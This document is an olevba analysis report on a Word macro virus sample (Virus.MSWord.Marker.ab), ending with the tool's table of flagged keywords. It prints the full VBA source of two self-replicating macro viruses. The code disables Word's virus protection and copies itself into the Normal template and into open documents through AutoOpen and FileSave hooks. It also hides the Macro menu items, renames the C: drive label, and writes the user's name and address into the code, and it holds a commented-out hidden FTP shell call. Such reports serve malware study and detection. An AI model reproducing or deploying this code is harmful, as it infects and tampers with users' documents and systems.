olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ab-defe04ec9ba23fb672b1c4dbf79edcdec2f2ef75
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ab-defe04ec9ba23fb672b1c4dbf79edcdec2f2ef75 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next

'DECLARATIONS

Dim sViralCode As String, nFreeFile As Integer
Dim oNormal As Object, oDocument As Object, sFileName As String
Dim rRange As Range

Const cIndicator = "CMC"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
    nFreeFile = FreeFile

    Randomize
    sFileName = "\CMC" + Str(32767 * Rnd) + ".txt"
    
    Open CurDir + sFileName For Output As #nFreeFile
        Write #nFreeFile, "Railways is an integral part of CMC LTD. JAI CMC"
    Close #nFreeFile
    
    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)
    
    If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oNormal.CodeModule.AddFromString sViralCode
        
    End If

'    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide
    
    If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oDocument.CodeModule.AddFromString sViralCode
    End If
    
    ActiveDocument.Save
    NormalTemplate.Save
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Marker.ab-defe04ec9ba23fb672b1c4dbf79edcdec2f2ef75 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I02 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I03 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I04 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I05 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I06 As String
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I07 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Public I08 As Boolean
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I09()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = NormalTemplate Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I01 = "normal"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        GoTo checkout
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
checkout:
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I10()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Next i
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I11()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I09
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I10
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "document" Then Call I12
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "normal" Then Call I13
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I01 = "orbit" Then Call I14
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I12()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I03 = False And I05 = False Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With NormalTemplate.VBProject
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Shell ("label c: groovie"), 0
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I13()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I17
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I04 = False And I07 = True Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With ActiveDocument.VBProject
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            .Execute
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = True Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I08 = False Then Documents.Open FileName:=I06
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If I02 = False And I07 = False Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Documents.Add Template:="", NewTemplate:=False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I14()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I03 = False And I05 = False Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With NormalTemplate.VBProject
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            NormalTemplate.Save
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        If I04 = False Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With ActiveDocument.VBProject
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With .VBComponents.Import("c:\groovie.sys")
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            With Dialogs(wdDialogFileSummaryInfo)
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Comments = "ALT-F11 says it's groovie!"
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
                .Execute
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
            End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Application.ScreenUpdating = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I15()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.VirusProtection = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.SaveNormalPrompt = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Options.ConfirmConversions = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I06 = ActiveDocument.FullName
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    Call I11
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoOpen()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoClose()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub AutoExit()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileSaveAs()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFileSaveAs).Show
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub filesave()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I16
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileclose()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.Close
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileprint()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFilePrint).Show
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ViewVBCode()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileTemplates()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I17()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error GoTo docek
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If ActiveDocument.Name <> "" Then
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I07 = True
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    GoTo over
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
docek:
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I07 = False
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
over:
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I16()
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Randomize
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rn = Int(Rnd * 999)
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 2 To 358 Step 2
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.DeleteLines x
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
 ' AM07.03.01 09:53:39710Andreas Marx710HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
